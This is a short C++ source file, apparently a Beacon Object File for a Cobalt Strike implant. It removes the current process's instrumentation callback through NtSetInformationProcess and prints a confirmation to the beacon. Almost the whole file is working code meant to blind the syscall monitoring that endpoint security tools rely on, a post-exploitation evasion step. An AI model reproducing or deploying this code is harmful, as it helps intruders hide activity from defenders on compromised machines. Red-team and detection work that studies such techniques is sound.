#include <Externs.hpp>
#include <Common.hpp>

typedef struct _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION
{
    ULONG Version;  // The version of the instrumentation callback information.
    ULONG Reserved; // Reserved for future use.
    PVOID Callback; // Pointer to the callback function.
} PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION, *PPROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;

auto RmCallback( VOID ) -> VOID {
    
    LONG    Status         = STATUS_SUCCESS;
    HANDLE  ProcessHandle  = NtCurrentProcess();

    PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION InstCallbackInfo = { 0 };

    InstCallbackInfo.Callback = NULL;
    InstCallbackInfo.Reserved = 0;
    InstCallbackInfo.Version  = 0;

    Status = NtSetInformationProcess(
        ProcessHandle, (PROCESSINFOCLASS)ProcessInstrumentationCallback,
        (PVOID)&InstCallbackInfo, sizeof( InstCallbackInfo )
    );

    BeaconPrintf( CALLBACK_OUTPUT, "[+] Process Instrumentation Callback Removed" ); 
}

EXTERN_C
auto go(PCHAR Args, INT Argc) -> void {
    Start();

    RmCallback();
}